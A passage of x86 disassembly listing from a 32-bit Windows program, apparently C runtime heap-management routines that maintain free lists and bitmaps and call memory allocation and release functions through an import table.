  426817:	lea    ecx,[eax+eax*4]
  42681a:	mov    eax,ds:0x463a00
  42681f:	lea    ecx,[eax+ecx*4]
  426822:	jmp    0x426836
  426824:	mov    edx,DWORD PTR [esp+0x4]
  426828:	sub    edx,DWORD PTR [eax+0xc]
  42682b:	cmp    edx,0x100000
  426831:	jb     0x42683c
  426833:	add    eax,0x14
  426836:	cmp    eax,ecx
  426838:	jb     0x426824
  42683a:	xor    eax,eax
  42683c:	ret    
  42683d:	push   ebp
  42683e:	mov    ebp,esp
  426840:	sub    esp,0x10
  426843:	mov    ecx,DWORD PTR [ebp+0x8]
  426846:	mov    eax,DWORD PTR [ecx+0x10]
  426849:	push   esi
  42684a:	mov    esi,DWORD PTR [ebp+0xc]
  42684d:	push   edi
  42684e:	mov    edi,esi
  426850:	sub    edi,DWORD PTR [ecx+0xc]
  426853:	add    esi,0xfffffffc
  426856:	shr    edi,0xf
  426859:	mov    ecx,edi
  42685b:	imul   ecx,ecx,0x204
  426861:	lea    ecx,[ecx+eax*1+0x144]
  426868:	mov    DWORD PTR [ebp-0x10],ecx
  42686b:	mov    ecx,DWORD PTR [esi]
  42686d:	dec    ecx
  42686e:	test   cl,0x1
  426871:	mov    DWORD PTR [ebp-0x4],ecx
  426874:	jne    0x426b51
  42687a:	push   ebx
  42687b:	lea    ebx,[ecx+esi*1]
  42687e:	mov    edx,DWORD PTR [ebx]
  426880:	mov    DWORD PTR [ebp-0xc],edx
  426883:	mov    edx,DWORD PTR [esi-0x4]
  426886:	mov    DWORD PTR [ebp-0x8],edx
  426889:	mov    edx,DWORD PTR [ebp-0xc]
  42688c:	test   dl,0x1
  42688f:	mov    DWORD PTR [ebp+0xc],ebx
  426892:	jne    0x426908
  426894:	sar    edx,0x4
  426897:	dec    edx
  426898:	cmp    edx,0x3f
  42689b:	jbe    0x4268a0
  42689d:	push   0x3f
  42689f:	pop    edx
  4268a0:	mov    ecx,DWORD PTR [ebx+0x4]
  4268a3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4268a6:	jne    0x4268ea
  4268a8:	cmp    edx,0x20
  4268ab:	mov    ebx,0x80000000
  4268b0:	jae    0x4268cb
  4268b2:	mov    ecx,edx
  4268b4:	shr    ebx,cl
  4268b6:	lea    ecx,[edx+eax*1+0x4]
  4268ba:	not    ebx
  4268bc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4268c0:	dec    BYTE PTR [ecx]
  4268c2:	jne    0x4268e7
  4268c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4268c7:	and    DWORD PTR [ecx],ebx
  4268c9:	jmp    0x4268e7
  4268cb:	lea    ecx,[edx-0x20]
  4268ce:	shr    ebx,cl
  4268d0:	lea    ecx,[edx+eax*1+0x4]
  4268d4:	not    ebx
  4268d6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4268dd:	dec    BYTE PTR [ecx]
  4268df:	jne    0x4268e7
  4268e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268e4:	and    DWORD PTR [ecx+0x4],ebx
  4268e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4268ea:	mov    edx,DWORD PTR [ebx+0x8]
  4268ed:	mov    ebx,DWORD PTR [ebx+0x4]
  4268f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4268f3:	add    ecx,DWORD PTR [ebp-0xc]
  4268f6:	mov    DWORD PTR [edx+0x4],ebx
  4268f9:	mov    edx,DWORD PTR [ebp+0xc]
  4268fc:	mov    ebx,DWORD PTR [edx+0x4]
  4268ff:	mov    edx,DWORD PTR [edx+0x8]
  426902:	mov    DWORD PTR [ebx+0x8],edx
  426905:	mov    DWORD PTR [ebp-0x4],ecx
  426908:	mov    edx,ecx
  42690a:	sar    edx,0x4
  42690d:	dec    edx
  42690e:	cmp    edx,0x3f
  426911:	jbe    0x426916
  426913:	push   0x3f
  426915:	pop    edx
  426916:	mov    ebx,DWORD PTR [ebp-0x8]
  426919:	and    ebx,0x1
  42691c:	mov    DWORD PTR [ebp-0xc],ebx
  42691f:	jne    0x4269b4
  426925:	sub    esi,DWORD PTR [ebp-0x8]
  426928:	mov    ebx,DWORD PTR [ebp-0x8]
  42692b:	sar    ebx,0x4
  42692e:	push   0x3f
  426930:	mov    DWORD PTR [ebp+0xc],esi
  426933:	dec    ebx
  426934:	pop    esi
  426935:	cmp    ebx,esi
  426937:	jbe    0x42693b
  426939:	mov    ebx,esi
  42693b:	add    ecx,DWORD PTR [ebp-0x8]
  42693e:	mov    edx,ecx
  426940:	sar    edx,0x4
  426943:	dec    edx
  426944:	cmp    edx,esi
  426946:	mov    DWORD PTR [ebp-0x4],ecx
  426949:	jbe    0x42694d
  42694b:	mov    edx,esi
  42694d:	cmp    ebx,edx
  42694f:	je     0x4269af
  426951:	mov    ecx,DWORD PTR [ebp+0xc]
  426954:	mov    esi,DWORD PTR [ecx+0x4]
  426957:	cmp    esi,DWORD PTR [ecx+0x8]
  42695a:	jne    0x426997
  42695c:	cmp    ebx,0x20
  42695f:	mov    esi,0x80000000
  426964:	jae    0x42697d
  426966:	mov    ecx,ebx
  426968:	shr    esi,cl
  42696a:	not    esi
  42696c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426970:	dec    BYTE PTR [ebx+eax*1+0x4]
  426974:	jne    0x426997
  426976:	mov    ecx,DWORD PTR [ebp+0x8]
  426979:	and    DWORD PTR [ecx],esi
  42697b:	jmp    0x426997
  42697d:	lea    ecx,[ebx-0x20]
  426980:	shr    esi,cl
  426982:	not    esi
  426984:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42698b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42698f:	jne    0x426997
  426991:	mov    ecx,DWORD PTR [ebp+0x8]
  426994:	and    DWORD PTR [ecx+0x4],esi
  426997:	mov    ecx,DWORD PTR [ebp+0xc]
  42699a:	mov    esi,DWORD PTR [ecx+0x8]
  42699d:	mov    ecx,DWORD PTR [ecx+0x4]
  4269a0:	mov    DWORD PTR [esi+0x4],ecx
  4269a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4269a6:	mov    esi,DWORD PTR [ecx+0x4]
  4269a9:	mov    ecx,DWORD PTR [ecx+0x8]
  4269ac:	mov    DWORD PTR [esi+0x8],ecx
  4269af:	mov    esi,DWORD PTR [ebp+0xc]
  4269b2:	jmp    0x4269b7
  4269b4:	mov    ebx,DWORD PTR [ebp+0x8]
  4269b7:	cmp    DWORD PTR [ebp-0xc],0x0
  4269bb:	jne    0x4269c5
  4269bd:	cmp    ebx,edx
  4269bf:	je     0x426a45
  4269c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4269c8:	lea    ecx,[ecx+edx*8]
  4269cb:	mov    ebx,DWORD PTR [ecx+0x4]
  4269ce:	mov    DWORD PTR [esi+0x8],ecx
  4269d1:	mov    DWORD PTR [esi+0x4],ebx
  4269d4:	mov    DWORD PTR [ecx+0x4],esi
  4269d7:	mov    ecx,DWORD PTR [esi+0x4]
  4269da:	mov    DWORD PTR [ecx+0x8],esi
  4269dd:	mov    ecx,DWORD PTR [esi+0x4]
  4269e0:	cmp    ecx,DWORD PTR [esi+0x8]
  4269e3:	jne    0x426a45
  4269e5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4269e9:	mov    BYTE PTR [ebp+0xf],cl
  4269ec:	inc    cl
  4269ee:	cmp    edx,0x20
  4269f1:	mov    BYTE PTR [edx+eax*1+0x4],cl
  4269f5:	jae    0x426a1c
  4269f7:	cmp    BYTE PTR [ebp+0xf],0x0
  4269fb:	jne    0x426a0b
  4269fd:	mov    ecx,edx
  4269ff:	mov    ebx,0x80000000
  426a04:	shr    ebx,cl
  426a06:	mov    ecx,DWORD PTR [ebp+0x8]
  426a09:	or     DWORD PTR [ecx],ebx
  426a0b:	mov    ebx,0x80000000
  426a10:	mov    ecx,edx
  426a12:	shr    ebx,cl
  426a14:	lea    eax,[eax+edi*4+0x44]
  426a18:	or     DWORD PTR [eax],ebx
  426a1a:	jmp    0x426a45
  426a1c:	cmp    BYTE PTR [ebp+0xf],0x0
  426a20:	jne    0x426a32
  426a22:	lea    ecx,[edx-0x20]
  426a25:	mov    ebx,0x80000000
  426a2a:	shr    ebx,cl
  426a2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426a2f:	or     DWORD PTR [ecx+0x4],ebx
  426a32:	lea    ecx,[edx-0x20]
  426a35:	mov    edx,0x80000000
  426a3a:	shr    edx,cl
  426a3c:	lea    eax,[eax+edi*4+0xc4]
  426a43:	or     DWORD PTR [eax],edx
  426a45:	mov    eax,DWORD PTR [ebp-0x4]
  426a48:	mov    DWORD PTR [esi],eax
  426a4a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  426a4e:	mov    eax,DWORD PTR [ebp-0x10]
  426a51:	dec    DWORD PTR [eax]
  426a53:	jne    0x426b50
  426a59:	mov    eax,ds:0x4639f8
  426a5e:	test   eax,eax
  426a60:	je     0x426b42
  426a66:	mov    ecx,DWORD PTR ds:0x463a10
  426a6c:	mov    esi,DWORD PTR ds:0x4290ec
  426a72:	push   0x4000
  426a77:	shl    ecx,0xf
  426a7a:	add    ecx,DWORD PTR [eax+0xc]
  426a7d:	mov    ebx,0x8000
  426a82:	push   ebx
  426a83:	push   ecx
  426a84:	call   esi
  426a86:	mov    ecx,DWORD PTR ds:0x463a10
  426a8c:	mov    eax,ds:0x4639f8
  426a91:	mov    edx,0x80000000
  426a96:	shr    edx,cl
  426a98:	or     DWORD PTR [eax+0x8],edx
  426a9b:	mov    eax,ds:0x4639f8
  426aa0:	mov    eax,DWORD PTR [eax+0x10]
  426aa3:	mov    ecx,DWORD PTR ds:0x463a10
  426aa9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426ab1:	mov    eax,ds:0x4639f8
  426ab6:	mov    eax,DWORD PTR [eax+0x10]
  426ab9:	dec    BYTE PTR [eax+0x43]
  426abc:	mov    eax,ds:0x4639f8
  426ac1:	mov    ecx,DWORD PTR [eax+0x10]
  426ac4:	cmp    BYTE PTR [ecx+0x43],0x0
  426ac8:	jne    0x426ad3
  426aca:	and    DWORD PTR [eax+0x4],0xfffffffe
  426ace:	mov    eax,ds:0x4639f8
  426ad3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426ad7:	jne    0x426b42
  426ad9:	push   ebx
  426ada:	push   0x0
  426adc:	push   DWORD PTR [eax+0xc]
  426adf:	call   esi
  426ae1:	mov    eax,ds:0x4639f8
  426ae6:	push   DWORD PTR [eax+0x10]
  426ae9:	push   0x0
  426aeb:	push   DWORD PTR ds:0x463c40
  426af1:	call   DWORD PTR ds:0x429034
  426af7:	mov    eax,ds:0x4639fc
  426afc:	mov    edx,DWORD PTR ds:0x463a00
  426b02:	lea    eax,[eax+eax*4]
  426b05:	shl    eax,0x2
  426b08:	mov    ecx,eax
  426b0a:	mov    eax,ds:0x4639f8
  426b0f:	sub    ecx,eax
  426b11:	lea    ecx,[ecx+edx*1-0x14]
  426b15:	push   ecx
  426b16:	lea    ecx,[eax+0x14]
  426b19:	push   ecx
  426b1a:	push   eax
  426b1b:	call   0x428370
  426b20:	mov    eax,DWORD PTR [ebp+0x8]
  426b23:	add    esp,0xc
  426b26:	dec    DWORD PTR ds:0x4639fc
  426b2c:	cmp    eax,DWORD PTR ds:0x4639f8
  426b32:	jbe    0x426b38
  426b34:	sub    DWORD PTR [ebp+0x8],0x14
  426b38:	mov    eax,ds:0x463a00
  426b3d:	mov    ds:0x463a08,eax
  426b42:	mov    eax,DWORD PTR [ebp+0x8]
  426b45:	mov    ds:0x4639f8,eax
  426b4a:	mov    DWORD PTR ds:0x463a10,edi
  426b50:	pop    ebx
  426b51:	pop    edi
  426b52:	pop    esi
  426b53:	leave  
  426b54:	ret    
  426b55:	mov    eax,ds:0x4639fc
  426b5a:	mov    ecx,DWORD PTR ds:0x463a0c
  426b60:	push   edi
  426b61:	xor    edi,edi
  426b63:	cmp    eax,ecx
  426b65:	jne    0x426b9b
  426b67:	lea    eax,[ecx+ecx*4+0x50]
  426b6b:	shl    eax,0x2
  426b6e:	push   eax
  426b6f:	push   DWORD PTR ds:0x463a00
  426b75:	push   edi
  426b76:	push   DWORD PTR ds:0x463c40
  426b7c:	call   DWORD PTR ds:0x42910c
  426b82:	cmp    eax,edi
  426b84:	jne    0x426b8a
  426b86:	xor    eax,eax
  426b88:	pop    edi
  426b89:	ret    
  426b8a:	add    DWORD PTR ds:0x463a0c,0x10
  426b91:	mov    ds:0x463a00,eax
  426b96:	mov    eax,ds:0x4639fc
  426b9b:	mov    ecx,DWORD PTR ds:0x463a00
  426ba1:	push   esi
  426ba2:	push   0x41c4
  426ba7:	push   0x8
  426ba9:	push   DWORD PTR ds:0x463c40
  426baf:	lea    eax,[eax+eax*4]
  426bb2:	lea    esi,[ecx+eax*4]
  426bb5:	call   DWORD PTR ds:0x429038
  426bbb:	cmp    eax,edi
  426bbd:	mov    DWORD PTR [esi+0x10],eax
  426bc0:	jne    0x426bc6
  426bc2:	xor    eax,eax
  426bc4:	jmp    0x426c09
  426bc6:	push   0x4
  426bc8:	push   0x2000
  426bcd:	push   0x100000
  426bd2:	push   edi
  426bd3:	call   DWORD PTR ds:0x429058
  426bd9:	cmp    eax,edi
  426bdb:	mov    DWORD PTR [esi+0xc],eax
  426bde:	jne    0x426bf2
  426be0:	push   DWORD PTR [esi+0x10]
  426be3:	push   edi
  426be4:	push   DWORD PTR ds:0x463c40
  426bea:	call   DWORD PTR ds:0x429034
  426bf0:	jmp    0x426bc2
  426bf2:	or     DWORD PTR [esi+0x8],0xffffffff
  426bf6:	mov    DWORD PTR [esi],edi
  426bf8:	mov    DWORD PTR [esi+0x4],edi
  426bfb:	inc    DWORD PTR ds:0x4639fc
  426c01:	mov    eax,DWORD PTR [esi+0x10]
  426c04:	or     DWORD PTR [eax],0xffffffff
  426c07:	mov    eax,esi
  426c09:	pop    esi
  426c0a:	pop    edi
  426c0b:	ret    
  426c0c:	push   ebp
  426c0d:	mov    ebp,esp
  426c0f:	push   ecx
  426c10:	push   ecx
  426c11:	mov    ecx,DWORD PTR [ebp+0x8]
  426c14:	mov    eax,DWORD PTR [ecx+0x8]
  426c17:	push   ebx
  426c18:	push   esi
  426c19:	mov    esi,DWORD PTR [ecx+0x10]
  426c1c:	push   edi
  426c1d:	xor    ebx,ebx
  426c1f:	jmp    0x426c24
  426c21:	shl    eax,1
  426c23:	inc    ebx
  426c24:	test   eax,eax
  426c26:	jge    0x426c21
  426c28:	mov    eax,ebx
  426c2a:	imul   eax,eax,0x204
  426c30:	lea    eax,[eax+esi*1+0x144]
  426c37:	push   0x3f
  426c39:	mov    DWORD PTR [ebp-0x8],eax
  426c3c:	pop    edx
  426c3d:	mov    DWORD PTR [eax+0x8],eax
  426c40:	mov    DWORD PTR [eax+0x4],eax
  426c43:	add    eax,0x8
  426c46:	dec    edx
  426c47:	jne    0x426c3d
  426c49:	push   0x4
  426c4b:	mov    edi,ebx
  426c4d:	push   0x1000
  426c52:	shl    edi,0xf
  426c55:	add    edi,DWORD PTR [ecx+0xc]
  426c58:	push   0x8000
  426c5d:	push   edi
  426c5e:	call   DWORD PTR ds:0x429058
  426c64:	test   eax,eax
  426c66:	jne    0x426c70
  426c68:	or     eax,0xffffffff
  426c6b:	jmp    0x426d0d
  426c70:	lea    edx,[edi+0x7000]
  426c76:	cmp    edi,edx
  426c78:	mov    DWORD PTR [ebp-0x4],edx
  426c7b:	ja     0x426cc0
  426c7d:	mov    ecx,edx
  426c7f:	sub    ecx,edi
  426c81:	shr    ecx,0xc
  426c84:	lea    eax,[edi+0x10]
  426c87:	inc    ecx
  426c88:	or     DWORD PTR [eax-0x8],0xffffffff
  426c8c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426c93:	lea    edx,[eax+0xffc]
  426c99:	mov    DWORD PTR [eax],edx
  426c9b:	lea    edx,[eax-0x1004]
  426ca1:	mov    DWORD PTR [eax-0x4],0xff0
  426ca8:	mov    DWORD PTR [eax+0x4],edx
  426cab:	mov    DWORD PTR [eax+0xfe8],0xff0
  426cb5:	add    eax,0x1000
  426cba:	dec    ecx
  426cbb:	jne    0x426c88
  426cbd:	mov    edx,DWORD PTR [ebp-0x4]
  426cc0:	mov    eax,DWORD PTR [ebp-0x8]
  426cc3:	add    eax,0x1f8
  426cc8:	lea    ecx,[edi+0xc]
  426ccb:	mov    DWORD PTR [eax+0x4],ecx
  426cce:	mov    DWORD PTR [ecx+0x8],eax
  426cd1:	lea    ecx,[edx+0xc]
  426cd4:	mov    DWORD PTR [eax+0x8],ecx
  426cd7:	mov    DWORD PTR [ecx+0x4],eax
  426cda:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426cdf:	xor    edi,edi
  426ce1:	inc    edi
  426ce2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426ce9:	mov    al,BYTE PTR [esi+0x43]
  426cec:	mov    cl,al
  426cee:	inc    cl
  426cf0:	test   al,al
  426cf2:	mov    eax,DWORD PTR [ebp+0x8]
  426cf5:	mov    BYTE PTR [esi+0x43],cl
  426cf8:	jne    0x426cfd
  426cfa:	or     DWORD PTR [eax+0x4],edi
  426cfd:	mov    edx,0x80000000
  426d02:	mov    ecx,ebx
  426d04:	shr    edx,cl
  426d06:	not    edx
  426d08:	and    DWORD PTR [eax+0x8],edx
  426d0b:	mov    eax,ebx
  426d0d:	pop    edi
  426d0e:	pop    esi
  426d0f:	pop    ebx
  426d10:	leave  
  426d11:	ret    
  426d12:	push   ebp
  426d13:	mov    ebp,esp
  426d15:	sub    esp,0xc
  426d18:	mov    ecx,DWORD PTR [ebp+0x8]
  426d1b:	mov    eax,DWORD PTR [ecx+0x10]
  426d1e:	push   ebx
  426d1f:	push   esi
  426d20:	mov    esi,DWORD PTR [ebp+0x10]
  426d23:	push   edi
  426d24:	mov    edi,DWORD PTR [ebp+0xc]
  426d27:	mov    edx,edi
  426d29:	sub    edx,DWORD PTR [ecx+0xc]
  426d2c:	add    esi,0x17
  426d2f:	shr    edx,0xf
  426d32:	mov    ecx,edx
  426d34:	imul   ecx,ecx,0x204
  426d3a:	lea    ecx,[ecx+eax*1+0x144]
  426d41:	mov    DWORD PTR [ebp-0xc],ecx
  426d44:	mov    ecx,DWORD PTR [edi-0x4]
  426d47:	and    esi,0xfffffff0
  426d4a:	dec    ecx
  426d4b:	cmp    esi,ecx
  426d4d:	lea    edi,[ecx+edi*1-0x4]
  426d51:	mov    ebx,DWORD PTR [edi]
  426d53:	mov    DWORD PTR [ebp+0x10],ecx
  426d56:	mov    DWORD PTR [ebp-0x4],ebx
  426d59:	jle    0x426eb4
  426d5f:	test   bl,0x1
  426d62:	jne    0x426ead
  426d68:	add    ebx,ecx
  426d6a:	cmp    esi,ebx
  426d6c:	jg     0x426ead
  426d72:	mov    ecx,DWORD PTR [ebp-0x4]
  426d75:	sar    ecx,0x4
  426d78:	dec    ecx
  426d79:	cmp    ecx,0x3f
  426d7c:	mov    DWORD PTR [ebp-0x8],ecx
  426d7f:	jbe    0x426d87
  426d81:	push   0x3f
  426d83:	pop    ecx
  426d84:	mov    DWORD PTR [ebp-0x8],ecx
  426d87:	mov    ebx,DWORD PTR [edi+0x4]
  426d8a:	cmp    ebx,DWORD PTR [edi+0x8]
  426d8d:	jne    0x426dd2
  426d8f:	cmp    ecx,0x20
  426d92:	mov    ebx,0x80000000
  426d97:	jae    0x426db3
  426d99:	shr    ebx,cl
  426d9b:	mov    ecx,DWORD PTR [ebp-0x8]
  426d9e:	lea    ecx,[ecx+eax*1+0x4]
  426da2:	not    ebx
  426da4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426da8:	dec    BYTE PTR [ecx]
  426daa:	jne    0x426dd2
  426dac:	mov    ecx,DWORD PTR [ebp+0x8]
  426daf:	and    DWORD PTR [ecx],ebx
  426db1:	jmp    0x426dd2
  426db3:	add    ecx,0xffffffe0
  426db6:	shr    ebx,cl
  426db8:	mov    ecx,DWORD PTR [ebp-0x8]
  426dbb:	lea    ecx,[ecx+eax*1+0x4]
  426dbf:	not    ebx
  426dc1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426dc8:	dec    BYTE PTR [ecx]
  426dca:	jne    0x426dd2
  426dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  426dcf:	and    DWORD PTR [ecx+0x4],ebx
  426dd2:	mov    ecx,DWORD PTR [edi+0x8]
  426dd5:	mov    ebx,DWORD PTR [edi+0x4]
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [edi+0x4]
  426dde:	mov    edi,DWORD PTR [edi+0x8]
  426de1:	mov    DWORD PTR [ecx+0x8],edi
  426de4:	mov    ecx,DWORD PTR [ebp+0x10]
  426de7:	sub    ecx,esi
  426de9:	add    DWORD PTR [ebp-0x4],ecx
  426dec:	cmp    DWORD PTR [ebp-0x4],0x0
  426df0:	jle    0x426e9b
  426df6:	mov    edi,DWORD PTR [ebp-0x4]
  426df9:	mov    ecx,DWORD PTR [ebp+0xc]
  426dfc:	sar    edi,0x4
  426dff:	dec    edi
  426e00:	cmp    edi,0x3f
  426e03:	lea    ecx,[ecx+esi*1-0x4]
  426e07:	jbe    0x426e0c
  426e09:	push   0x3f
  426e0b:	pop    edi
  426e0c:	mov    ebx,DWORD PTR [ebp-0xc]
  426e0f:	lea    ebx,[ebx+edi*8]
  426e12:	mov    DWORD PTR [ebp+0x10],ebx
  426e15:	mov    ebx,DWORD PTR [ebx+0x4]
  426e18:	mov    DWORD PTR [ecx+0x4],ebx
  426e1b:	mov    ebx,DWORD PTR [ebp+0x10]
  426e1e:	mov    DWORD PTR [ecx+0x8],ebx
  426e21:	mov    DWORD PTR [ebx+0x4],ecx
  426e24:	mov    ebx,DWORD PTR [ecx+0x4]
  426e27:	mov    DWORD PTR [ebx+0x8],ecx
  426e2a:	mov    ebx,DWORD PTR [ecx+0x4]
  426e2d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426e30:	jne    0x426e89
  426e32:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426e36:	mov    BYTE PTR [ebp+0x13],cl
  426e39:	inc    cl
  426e3b:	cmp    edi,0x20
  426e3e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426e42:	jae    0x426e60
  426e44:	cmp    BYTE PTR [ebp+0x13],0x0
  426e48:	jne    0x426e58
  426e4a:	mov    ecx,edi
  426e4c:	mov    ebx,0x80000000
  426e51:	shr    ebx,cl
  426e53:	mov    ecx,DWORD PTR [ebp+0x8]
  426e56:	or     DWORD PTR [ecx],ebx
  426e58:	lea    eax,[eax+edx*4+0x44]
  426e5c:	mov    ecx,edi
  426e5e:	jmp    0x426e80
  426e60:	cmp    BYTE PTR [ebp+0x13],0x0
  426e64:	jne    0x426e76
  426e66:	lea    ecx,[edi-0x20]
  426e69:	mov    ebx,0x80000000
  426e6e:	shr    ebx,cl
  426e70:	mov    ecx,DWORD PTR [ebp+0x8]
  426e73:	or     DWORD PTR [ecx+0x4],ebx
  426e76:	lea    eax,[eax+edx*4+0xc4]
  426e7d:	lea    ecx,[edi-0x20]
  426e80:	mov    edx,0x80000000
  426e85:	shr    edx,cl
  426e87:	or     DWORD PTR [eax],edx
  426e89:	mov    edx,DWORD PTR [ebp+0xc]
  426e8c:	mov    ecx,DWORD PTR [ebp-0x4]
  426e8f:	lea    eax,[edx+esi*1-0x4]
  426e93:	mov    DWORD PTR [eax],ecx
  426e95:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426e99:	jmp    0x426e9e
  426e9b:	mov    edx,DWORD PTR [ebp+0xc]
  426e9e:	lea    eax,[esi+0x1]
  426ea1:	mov    DWORD PTR [edx-0x4],eax
  426ea4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426ea8:	jmp    0x426fe9
  426ead:	xor    eax,eax
  426eaf:	jmp    0x426fec
  426eb4:	jge    0x426fe9
  426eba:	mov    ebx,DWORD PTR [ebp+0xc]
  426ebd:	sub    DWORD PTR [ebp+0x10],esi
  426ec0:	lea    ecx,[esi+0x1]
  426ec3:	mov    DWORD PTR [ebx-0x4],ecx
  426ec6:	lea    ebx,[ebx+esi*1-0x4]
  426eca:	mov    esi,DWORD PTR [ebp+0x10]
  426ecd:	sar    esi,0x4
  426ed0:	dec    esi
  426ed1:	cmp    esi,0x3f
  426ed4:	mov    DWORD PTR [ebp+0xc],ebx
  426ed7:	mov    DWORD PTR [ebx-0x4],ecx
  426eda:	jbe    0x426edf
  426edc:	push   0x3f
  426ede:	pop    esi
  426edf:	test   BYTE PTR [ebp-0x4],0x1
  426ee3:	jne    0x426f69
  426ee9:	mov    esi,DWORD PTR [ebp-0x4]
  426eec:	sar    esi,0x4
  426eef:	dec    esi
  426ef0:	cmp    esi,0x3f
  426ef3:	jbe    0x426ef8
  426ef5:	push   0x3f
  426ef7:	pop    esi
  426ef8:	mov    ecx,DWORD PTR [edi+0x4]
  426efb:	cmp    ecx,DWORD PTR [edi+0x8]
  426efe:	jne    0x426f42
  426f00:	cmp    esi,0x20
  426f03:	mov    ebx,0x80000000
  426f08:	jae    0x426f23
  426f0a:	mov    ecx,esi
  426f0c:	shr    ebx,cl
  426f0e:	lea    esi,[esi+eax*1+0x4]
  426f12:	not    ebx
  426f14:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426f18:	dec    BYTE PTR [esi]
  426f1a:	jne    0x426f3f
  426f1c:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1f:	and    DWORD PTR [ecx],ebx
  426f21:	jmp    0x426f3f
  426f23:	lea    ecx,[esi-0x20]
  426f26:	shr    ebx,cl
  426f28:	lea    ecx,[esi+eax*1+0x4]
  426f2c:	not    ebx
  426f2e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426f35:	dec    BYTE PTR [ecx]
  426f37:	jne    0x426f3f
  426f39:	mov    ecx,DWORD PTR [ebp+0x8]
  426f3c:	and    DWORD PTR [ecx+0x4],ebx
  426f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  426f42:	mov    ecx,DWORD PTR [edi+0x8]
  426f45:	mov    esi,DWORD PTR [edi+0x4]
  426f48:	mov    DWORD PTR [ecx+0x4],esi
  426f4b:	mov    esi,DWORD PTR [edi+0x8]
  426f4e:	mov    ecx,DWORD PTR [edi+0x4]
  426f51:	mov    DWORD PTR [ecx+0x8],esi
  426f54:	mov    esi,DWORD PTR [ebp+0x10]
  426f57:	add    esi,DWORD PTR [ebp-0x4]
  426f5a:	mov    DWORD PTR [ebp+0x10],esi
  426f5d:	sar    esi,0x4
  426f60:	dec    esi
  426f61:	cmp    esi,0x3f
  426f64:	jbe    0x426f69
  426f66:	push   0x3f
  426f68:	pop    esi
  426f69:	mov    ecx,DWORD PTR [ebp-0xc]
  426f6c:	lea    ecx,[ecx+esi*8]
  426f6f:	mov    edi,DWORD PTR [ecx+0x4]
  426f72:	mov    DWORD PTR [ebx+0x8],ecx
  426f75:	mov    DWORD PTR [ebx+0x4],edi
  426f78:	mov    DWORD PTR [ecx+0x4],ebx
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    DWORD PTR [ecx+0x8],ebx
  426f81:	mov    ecx,DWORD PTR [ebx+0x4]
  426f84:	cmp    ecx,DWORD PTR [ebx+0x8]
  426f87:	jne    0x426fe0
  426f89:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426f8d:	mov    BYTE PTR [ebp+0xf],cl
  426f90:	inc    cl
  426f92:	cmp    esi,0x20
  426f95:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426f99:	jae    0x426fb7
  426f9b:	cmp    BYTE PTR [ebp+0xf],0x0
  426f9f:	jne    0x426faf
  426fa1:	mov    ecx,esi
  426fa3:	mov    edi,0x80000000
  426fa8:	shr    edi,cl
  426faa:	mov    ecx,DWORD PTR [ebp+0x8]
  426fad:	or     DWORD PTR [ecx],edi
  426faf:	lea    eax,[eax+edx*4+0x44]
  426fb3:	mov    ecx,esi
  426fb5:	jmp    0x426fd7
  426fb7:	cmp    BYTE PTR [ebp+0xf],0x0
  426fbb:	jne    0x426fcd
  426fbd:	lea    ecx,[esi-0x20]
  426fc0:	mov    edi,0x80000000
  426fc5:	shr    edi,cl
  426fc7:	mov    ecx,DWORD PTR [ebp+0x8]
  426fca:	or     DWORD PTR [ecx+0x4],edi
  426fcd:	lea    eax,[eax+edx*4+0xc4]
  426fd4:	lea    ecx,[esi-0x20]
  426fd7:	mov    edx,0x80000000
  426fdc:	shr    edx,cl
  426fde:	or     DWORD PTR [eax],edx
  426fe0:	mov    eax,DWORD PTR [ebp+0x10]
  426fe3:	mov    DWORD PTR [ebx],eax
  426fe5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426fe9:	xor    eax,eax
  426feb:	inc    eax
  426fec:	pop    edi
  426fed:	pop    esi
  426fee:	pop    ebx
  426fef:	leave  
  426ff0:	ret    
  426ff1:	push   ebp
  426ff2:	mov    ebp,esp
  426ff4:	sub    esp,0x14
  426ff7:	mov    ecx,DWORD PTR [ebp+0x8]
  426ffa:	mov    eax,ds:0x4639fc
  426fff:	mov    edx,DWORD PTR ds:0x463a00
  427005:	add    ecx,0x17
  427008:	and    ecx,0xfffffff0
  42700b:	push   ebx
  42700c:	mov    DWORD PTR [ebp-0x10],ecx
  42700f:	sar    ecx,0x4
  427012:	push   esi
  427013:	lea    eax,[eax+eax*4]
  427016:	push   edi
  427017:	dec    ecx
  427018:	cmp    ecx,0x20
  42701b:	lea    edi,[edx+eax*4]
  42701e:	mov    DWORD PTR [ebp-0x4],edi
  427021:	jge    0x42702e
  427023:	or     esi,0xffffffff
  427026:	shr    esi,cl
  427028:	or     DWORD PTR [ebp-0x8],0xffffffff
